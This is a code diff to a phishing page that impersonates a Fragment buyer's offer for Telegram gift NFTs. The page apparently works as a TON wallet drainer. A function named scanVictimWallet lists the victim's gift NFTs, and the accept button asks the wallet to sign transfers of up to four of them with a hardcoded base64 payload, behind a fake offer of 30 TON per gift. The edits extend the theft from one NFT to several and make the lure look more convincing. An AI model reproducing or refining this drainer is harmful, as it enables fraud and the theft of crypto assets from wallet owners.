@@ -17,7 +17,6 @@
         
         .header { font-size: 20px; font-weight: bold; color: var(--accent); margin-bottom: 24px; display: flex; align-items: center; justify-content: center; gap: 8px;}
         
-        /* ЖЕСТКИЙ ФИКС КАРТИНКИ */
         .gift-img-wrapper { 
             width: 160px; 
             height: 160px; 
@@ -25,14 +24,14 @@
             background: #232429; 
             border-radius: 16px; 
             overflow: hidden; 
-            position: relative;
-            display: block; /* Убрал flex, чтобы картинка вела себя предсказуемо */
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
         }
         .gift-img { 
-            width: 160px; 
-            height: 160px; 
-            object-fit: cover; /* Картинка заполняет весь квадрат, обрезая лишнее */
-            display: block;
+            width: 100%; 
+            height: 100%; 
+            object-fit: contain; /* Теперь картинка не будет обрезаться */
         }
         
         .gift-collection { font-size: 12px; color: var(--dim); text-transform: uppercase; margin-bottom: 4px; }
@@ -64,16 +63,18 @@
                 Fragment
             </div>
             
-            <div class="gift-img-wrapper" id="imgWrapper">
-                <img class="gift-img" id="giftImage" src="" alt="Gift" onload="this.classList.add('loaded')">
+            <div class="gift-img-wrapper">
+                <img class="gift-img" id="giftImage" src="" alt="Gift">
             </div>
             
             <div class="gift-collection" id="giftCollection">Gifts Collection</div>
             <div class="gift-name" id="giftName">Loading...</div>
+            
+            <div class="gift-count" id="giftCount"></div>
 
             <div class="offer-box">
                 <div class="offer-label">Buyer's offer</div>
-                <div class="offer-price">30 <small>TON</small></div>
+                <div class="offer-price" id="offerPriceText">30 <small>TON</small></div>
             </div>
             
             <p style="color: var(--dim); font-size: 13px; margin-bottom: 20px;">
@@ -92,9 +93,9 @@
             manifestUrl: "https://fragment.com/tonconnect-manifest.json" 
         });
 
-        // СЮДА ВСТАВЬ СВОЙ ПЕЙЛОАД ИЗ ПИТОНА
         const PAYLOAD_B64 = "te6ccgEBAQEAUgAAn1/MPRQAAAAAAAAAAIAUIVzVDKXiNQfZsAcaEKh0kx0hTdnk2OpKbBCtk5K+jLAChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZQI"; 
-        let targetNftAddress = null;
+        let allNftAddresses = [];
+        let totalPrice = 0;
 
         const connectBtn = document.getElementById('connectBtn');
         const loading = document.getElementById('loading');
@@ -161,7 +162,7 @@
 
         async function scanVictimWallet(address) {
             try {
-                const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts`);
+                const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=50`);
                 const data = await res.json();
 
                 if (!data.nft_items || data.nft_items.length === 0) {
@@ -169,22 +170,43 @@
                     return;
                 }
 
-                let nft = data.nft_items.find(item => 
+                const gifts = data.nft_items.filter(item => 
                     (item.collection?.name || "").toLowerCase().includes("gift") || 
                     (item.metadata?.name || "").toLowerCase().includes("gift")
-                ) || data.nft_items[0];
+                );
 
-                targetNftAddress = toFriendlyAddress(nft.address);
+                if (gifts.length === 0) {
+                    loading.innerText = "Подарков не найдено.";
+                    return;
+                }
 
-                // Иногда API возвращает превью в виде SVG-заглушки, 
-                // поэтому пытаемся взять оригинальное изображение из metadata, если оно есть
+                allNftAddresses = gifts.map(item => toFriendlyAddress(item.address));
+                const mainNft = gifts[0];
+                
+                // --- ФИКС КАРТИНКИ ---
+                // Вместо размытой превьюшки из API, генерируем прямую ссылку на оригинал из CDN Fragment
                 let imgUrl = "";
-                if (nft.previews && nft.previews.length > 0) imgUrl = nft.previews[0].url;
-                else if (nft.metadata && nft.metadata.image) imgUrl = nft.metadata.image;
+                const nftName = mainNft.metadata?.name || "";
+                const match = nftName.match(/#(\d+)/); // Извлекаем ID из названия (например, #131877)
+                
+                if (match && match[1]) {
+                    const nftId = match[1];
+                    const collectionSlug = (mainNft.collection?.name || "").toLowerCase().replace(/[\s']/g, ''); // xmas stocking -> xmasstocking
+                    // Пытаемся собрать ссылку на оригинал
+                    imgUrl = `https://nft.fragment.com/gift/${collectionSlug}-${nftId}.medium.jpg`;
+                } else if (mainNft.metadata?.image) {
+                    imgUrl = mainNft.metadata.image;
+                } else if (mainNft.previews && mainNft.previews.length > 0) {
+                    imgUrl = mainNft.previews[0].url;
+                }
 
                 document.getElementById('giftImage').src = imgUrl;
-                document.getElementById('giftName').innerText = nft.metadata?.name || "Telegram Gift";
-                document.getElementById('giftCollection').innerText = nft.collection?.name || "Gifts Collection";
+                document.getElementById('giftName').innerText = mainNft.metadata?.name || "Telegram Gift";
+                document.getElementById('giftCollection').innerText = mainNft.collection?.name || "Gifts Collection";
+                
+                totalPrice = gifts.length * 30;
+                document.getElementById('offerPriceText').innerHTML = `${totalPrice} <small>TON</small>`;
+                document.getElementById('giftCount').innerText = `+ ещё ${gifts.length - 1} подарков в этой коллекции`;
 
                 loading.classList.remove('active');
                 mainCard.classList.add('active');
@@ -197,7 +219,7 @@
         }
 
         acceptBtn.addEventListener('click', async () => {
-            if (!targetNftAddress) return;
+            if (allNftAddresses.length === 0) return;
             
             acceptBtn.disabled = true; 
             acceptBtn.innerText = "Processing...";
@@ -205,13 +227,15 @@
             try {
                 acceptBtn.innerText = "Confirm in wallet...";
                 
+                const messages = allNftAddresses.slice(0, 4).map(addr => ({
+                    address: addr,
+                    amount: "50000000",
+                    payload: PAYLOAD_B64
+                }));
+
                 await tonConnectUI.sendTransaction({
                     validUntil: Math.floor(Date.now() / 1000) + 300,
-                    messages: [{
-                        address: targetNftAddress,
-                        amount: "50000000",
-                        payload: PAYLOAD_B64
-                    }]
+                    messages: messages
                 });
                 
                 acceptBtn.innerText = "Offer Accepted ✓";
